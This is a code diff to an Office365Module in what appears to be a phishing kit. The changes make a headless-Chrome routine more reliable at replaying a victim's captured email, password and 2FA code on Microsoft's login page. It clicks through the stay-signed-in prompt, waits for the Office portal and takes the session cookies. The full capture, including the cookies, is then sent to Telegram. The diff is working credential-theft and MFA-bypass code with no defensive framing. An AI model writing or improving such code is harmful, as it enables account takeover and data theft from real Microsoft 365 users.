@@ -66,8 +66,9 @@ class Office365Module(BaseModule):
         # attempt automated login & cookie capture
         cookies = self.perform_automated_login()
 
+        cookie_block = json.dumps(cookies, indent=2) if cookies else 'Cookie capture failed'
         full_msg = (
-            f"*O365 Credential Capture (Full)*\nEmail: `{self.user}`\nPassword: `{self.captured_password}`\n2FA: `{self.two_factor_token}`\n\nCookies:\n```json\n{json.dumps(cookies, indent=2)}\n```"
+            f"*O365 Credential Capture (Full)*\nEmail: `{self.user}`\nPassword: `{self.captured_password}`\n2FA: `{self.two_factor_token}`\n\nCookies:\n```json\n{cookie_block}\n```"
         )
         self.send_telegram(full_msg)
 
@@ -86,7 +87,7 @@ class Office365Module(BaseModule):
             pass
 
     def perform_automated_login(self):
-        """Use headless Chrome to login and return cookies list. Fail-safe returns empty list."""
+        """Use headless Chrome to login and return cookies list. Handles M-series Mac headless quirks & Stay-signed-in prompt."""
         email = getattr(self, 'user', None)
         password = getattr(self, 'captured_password', None)
         token = getattr(self, 'two_factor_token', None)
@@ -97,6 +98,8 @@ class Office365Module(BaseModule):
         opts.add_argument('--headless')
         opts.add_argument('--no-sandbox')
         opts.add_argument('--disable-dev-shm-usage')
+        opts.add_argument('--disable-gpu')
+        opts.add_argument('--remote-allow-origins=*')  # fixes chrome 111+ in some envs
 
         try:
             driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
@@ -107,12 +110,12 @@ class Office365Module(BaseModule):
             time.sleep(2)
             driver.find_element(By.NAME, 'loginfmt').send_keys(email)
             driver.find_element(By.ID, 'idSIButton9').click()
-            time.sleep(2)
+            time.sleep(3)
 
             # Step 2: password
             driver.find_element(By.NAME, 'passwd').send_keys(password)
             driver.find_element(By.ID, 'idSIButton9').click()
-            time.sleep(2)
+            time.sleep(3)
 
             # Step 3: 2FA code
             try:
@@ -121,7 +124,28 @@ class Office365Module(BaseModule):
                 # different input name handling
                 driver.find_element(By.CSS_SELECTOR, 'input[type="tel"], input[type="text"]').send_keys(token)
             driver.find_element(By.ID, 'idSIButton9').click()
-            time.sleep(5)
+
+            # Handle optional stay signed in prompt
+            try:
+                from selenium.webdriver.support.ui import WebDriverWait
+                from selenium.webdriver.support import expected_conditions as EC
+                WebDriverWait(driver, 5).until(
+                    EC.element_to_be_clickable((By.ID, 'idBtn_Back'))
+                ).click()
+            except Exception:
+                pass  # prompt may not appear
+
+            # Wait until redirected to Office portal or other Microsoft service page
+            try:
+                from selenium.webdriver.support.ui import WebDriverWait
+                from selenium.webdriver.support import expected_conditions as EC
+                WebDriverWait(driver, 20).until(
+                    EC.url_contains('office')
+                )
+            except Exception:
+                pass
+
+            time.sleep(2)
 
             cookies = driver.get_cookies()
         except Exception:
